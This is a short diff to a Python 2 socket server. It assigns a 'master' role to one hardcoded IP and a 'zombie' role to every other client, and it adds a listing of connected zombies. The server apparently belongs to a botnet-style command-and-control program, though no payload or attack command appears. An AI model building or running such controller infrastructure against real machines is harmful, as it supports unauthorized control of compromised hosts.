@@ -19,7 +19,7 @@ class SocketServer(socket.socket):
             print ex
         finally:
             print "Server closed"
-            for client in self.clients:
+            for client,role in self.clients:
                 client.close()
             self.close()
 
@@ -27,7 +27,7 @@ class SocketServer(socket.socket):
         while 1:
             (clientsocket, address) = self.accept()
             #Adding client to clients list
-            if address[0] == "192.162.15.15":
+            if address[0] == "192.168.25.3":
                 role = "master"
             else:
                 role = "zombie"
@@ -75,7 +75,7 @@ class SocketServer(socket.socket):
 
     def listzombies(self):
         pass
-        
+
     def onopen(self, client, address, role):
         pass
 
@@ -106,8 +106,9 @@ class BasicChatServer(SocketServer):
     def listzombies(self):
         #List all clients currently connected
         i = 0
-        for client in self.clients:
-            print "Zombie #" + str(i) + " - at " + client.getsockname()[0]
+        for client,role in self.clients:
+            if role == "zombie":
+                print "Zombie #" + str(i) + " - at " + client.getsockname()[0]
             i += 1
 
 def main():
